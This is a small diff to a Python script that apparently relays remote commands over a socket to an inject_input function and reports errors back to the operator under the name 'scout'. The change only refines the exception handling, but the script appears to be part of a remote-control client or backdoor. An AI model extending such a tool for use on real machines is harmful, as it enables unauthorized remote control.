@@ -222,10 +222,15 @@ def main():
                         inject_input(command, arg[1])
                     else:
                         inject_input(command, None)
-            except:
+            except (socket.error, socket.timeout):
                 s.shutdown(1)
                 s.close()
                 break
+            except Exception as e:
+                try:
+                    s.sendall('[-]Error running command "' + command + '" : ' + str(e) + End)
+                except:
+                    s.sendall('[-]Error with scout : ' + str(e))
 
 
 main()
